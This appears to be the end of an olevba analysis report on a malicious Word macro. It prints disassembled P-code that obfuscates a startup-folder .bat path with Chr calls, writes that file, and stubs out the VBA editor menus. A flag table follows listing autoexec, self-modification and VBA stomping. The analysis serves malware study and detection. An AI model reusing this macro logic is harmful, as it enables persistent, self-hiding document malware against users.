' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #78:
' 	Ld hFile 
' 	Close 0x0001 
' Line #79:
' 	EndSub 
' Line #80:
' 	QuoteRem 0x0000 0x0016 "Yes I know my enemies."
' Line #81:
' 	QuoteRem 0x0000 0x002E "They're the teachers who taught me to fight me"
' Line #82:
' 	QuoteRem 0x0000 0x0030 "Compromise, conformity, assimilation, submission"
' Line #83:
' 	QuoteRem 0x0000 0x002D "Ignorance, hypocrisy, brutality, the elite..."
' Line #84:
' Line #85:
' 	FuncDefn (Sub ViewVBCode())
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub ToolsMacro())
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Sub FilePrint())
' Line #90:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #91:
' 	EndSub 
' Line #92:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

